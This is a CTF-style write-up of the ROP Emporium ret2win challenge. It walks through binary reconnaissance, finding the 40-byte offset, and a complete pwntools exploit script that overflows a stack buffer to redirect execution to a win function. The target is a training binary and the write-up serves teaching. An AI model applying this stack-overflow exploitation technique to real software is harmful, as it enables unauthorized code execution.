---
title: ROP Emporium - ret2win Challenge Writeup
tags: [pwn, rop, binary exploitation, x64]
style: border
color: primary
description: Writeup for the ret2win challenge from ROP Emporium - an introduction to return-oriented programming by redirecting execution to a win function.
---

## Challenge Overview

The **ret2win** challenge is the first challenge in the ROP Emporium series, designed to introduce the basic concept of return-oriented programming (ROP). The goal is to exploit a buffer overflow vulnerability to redirect program execution to a `ret2win` function that prints the flag.

**Challenge Link**: [ROP Emporium - ret2win](https://ropemporium.com/challenge/ret2win.html)

## Binary Analysis

### Initial Reconnaissance

```bash
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64

$ checksec ret2win
[*] Checking for new versions of pwntools
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
- 64-bit ELF binary
- NX is enabled (stack is not executable)
- No stack canary (buffer overflow is possible)
- No PIE (addresses are fixed)

### Static Analysis

Running the binary shows a simple prompt:

```bash
$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> test
Thank you!
Exiting
```

Using a disassembler (radare2/Ghidra/IDA), we can identify:

1. **main()**: Calls `pwnme()`
2. **pwnme()**: Contains a buffer overflow vulnerability - reads 56 bytes into a 32-byte buffer
3. **ret2win()**: The target function that prints the flag

## Exploitation Strategy

The exploitation is straightforward:
1. Overflow the buffer in `pwnme()`
2. Overwrite the return address with the address of `ret2win()`
3. When `pwnme()` returns, execution jumps to `ret2win()`

### Finding the ret2win Address

```bash
$ r2 ret2win
[0x00400650]> aaa
[0x00400650]> afl | grep ret2win
0x00400756    1 27           ret2win
```

The `ret2win` function is located at `0x400756`.

### Finding the Offset

We need to determine how many bytes are required to reach the return address:

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(100)
io = process('./ret2win')
io.sendlineafter(b'>', pattern)
io.wait()

# Find offset using core dump
core = Coredump('./core')
offset = cyclic_find(core.read(core.rsp, 4))
print(f"Offset: {offset}")
```

The offset is **40 bytes** (32 bytes buffer + 8 bytes saved RBP).

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import sys

elf = ELF("ret2win")
context.binary = elf
binary = elf.path
context.log_level = "debug"
IP, PORT = "address", 1337

global io
breakpoints = '''
'''

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
else:
    io = process(binary)
    gdb.attach(io, breakpoints)

sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)

def main(io):
    # Addresses
    ret2win = 0x400756
    ret = 0x000000000040053e  # Simple ret gadget for stack alignment

    # Build payload
    payload = b'a' * 32     # Fill buffer
    payload += b'b' * 8     # Overwrite saved RBP
    payload += p64(ret)     # Stack alignment (optional but good practice)
    payload += p64(ret2win) # Overwrite return address with ret2win
    
    sla('> ', payload)
    io.interactive()

if __name__ == "__main__":
    main(io)
```

### Why the extra `ret` gadget?

You might notice we include a simple `ret` gadget at `0x40053e` before jumping to `ret2win`. This ensures 16-byte stack alignment, which is required by the x64 System V ABI. Some functions (especially those that use SSE instructions) will crash if the stack isn't properly aligned. While not always necessary, it's good practice to include it.

You can find a suitable `ret` gadget using:
```bash
$ ROPgadget --binary ret2win | grep ": ret$" | head -1
0x000000000040053e : ret
```

## Running the Exploit

```bash
$ python3 exploit_ret2win.py
[*] '/path/to/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/path/to/ret2win': pid 12345
[*] Receiving all data
[*] Process '/path/to/ret2win' stopped with exit code 0 (pid 12345)

Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

## Key Takeaways

1. **Buffer Overflow Basics**: Understanding how to overflow a buffer to overwrite the return address
2. **Return-Oriented Programming Introduction**: Redirecting execution to existing code (ret2win function)
3. **x64 Calling Convention**: Understanding stack layout and return address location
4. **NX Bypass**: Instead of injecting shellcode, we redirect to existing code

This challenge serves as an excellent introduction to ROP techniques, which become more complex in subsequent challenges.

---

**Challenge Completed**: ✓  
**Next Challenge**: [split](https://ropemporium.com/challenge/split.html)
